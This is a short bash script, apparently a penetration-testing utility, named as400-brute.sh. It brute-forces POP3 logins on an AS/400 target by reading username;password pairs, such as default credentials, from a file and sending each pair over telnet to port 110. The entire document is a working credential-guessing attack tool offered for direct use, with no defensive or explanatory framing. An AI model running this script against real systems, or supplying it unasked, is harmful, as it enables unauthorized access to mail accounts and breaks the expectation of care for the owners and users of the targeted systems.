#!/bin/bash

# Usage: ./as400-brute.sh [User;pass.file] [IP target]
#
# E.g. ./as400-brute.sh default_creds.txt 10.100.100.40
#
# [Semi colon delimit the files, or change the value below in the 'cut' command]

cat $1 | while read line
do
        user=$(echo $line | cut -d ';' -f 1)
        pass=$(echo $line | cut -d ';' -f 2)
        { echo "USER $user"; sleep 1; echo "PASS $pass"; sleep 1; } | telnet "$2" 110 # POP3 Port
done
